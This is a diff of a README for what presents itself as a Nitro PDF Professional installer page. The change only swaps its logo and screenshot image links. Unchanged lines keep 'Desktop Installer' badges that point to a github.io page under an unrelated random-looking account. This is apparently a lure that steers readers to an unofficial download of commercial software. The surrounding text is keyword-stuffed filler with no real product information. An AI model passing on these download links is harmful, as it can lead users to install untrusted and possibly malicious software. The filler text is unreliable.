@@ -1,7 +1,7 @@
 # Nitro PDF Professional Document Management and Productivity Environment
 
 <div align="center">
-  <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTwdLxyOvcvkTMldBso90U9jJs070EwXyyKSvpyvCce4l1u3oSjZ79FwPQ&s=10" alt="Program Logo"/>
+  <img src="https://cdn.cookielaw.org/logos/3126d1a4-365c-4537-9093-3ee90642774c/33adf9a2-9f2e-4976-b389-1038247bc7ec/56f2887c-d23e-4036-8338-afa74a9ac2c8/logo_nitro_full_darkVersion.png" alt="Program Logo"/>
 </div>
 
 [![Desktop Installer](https://badgen.net/badge/Desktop/Installer/blue?icon=windows)](https://kendalbozzonertniew.github.io/.github/Nitro-Pdf-Desktop-Client)
@@ -21,7 +21,7 @@ Security compliance officers seeking reliable validation mechanisms implement th
 Isolating sensitive record structures becomes fully automated when utilizing the native Nitro PDF validation workspace. Information security teams use the underlying system profiles to test document integrity and audit certificate fields within an isolated processing sandbox. Establishing the complete Nitro Pro workspace infrastructure helps business operations organize their corporate knowledge base and protect proprietary record assets.
 
 <div align="center">
-  <img src="https://www.gonitro.com/hs-fs/hubfs/_Website/_Screens/Screenshot%20Carousel-PDF-Convert.png?width=1400&height=600&name=Screenshot%20Carousel-PDF-Convert.png" alt="Program Interface Screenshot"/>
+  <img src="https://gramfile.com/wp-content/uploads/2024/01/Nitro-PDF-Pro-for-Windows-PC.webp" alt="Program Interface Screenshot"/>
 </div>
 
 [![Desktop Installer](https://badgen.net/badge/Desktop/Installer/blue?icon=windows)](https://kendalbozzonertniew.github.io/.github/Nitro-Pdf-Desktop-Client)
